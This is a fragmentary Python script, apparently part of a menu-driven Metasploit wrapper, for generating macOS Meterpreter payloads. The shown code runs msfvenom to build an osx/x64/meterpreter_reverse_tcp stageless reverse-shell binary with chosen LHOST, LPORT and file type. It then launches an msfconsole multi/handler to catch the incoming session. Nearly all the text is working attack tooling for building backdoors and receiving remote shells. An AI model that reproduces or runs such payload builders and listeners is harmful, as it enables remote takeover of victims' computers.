...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mmacOS/Meterpreter/Stageless/Reverse/TCP/x64\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mmacOS/Meterpreter/Stageless/Reverse/TCP/x64\033[1;31m)> \033[1;32m")
...
time.sleep(3)
os.system(f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {File_Type} -o {File}.{File_Type}")
...
if Listener == "Listener/msfconsole":
                    time.sleep(0.5)
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole = f"msfconsole -q -x "f"'use multi/handler; set payload osx/x64/meterpreter_reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
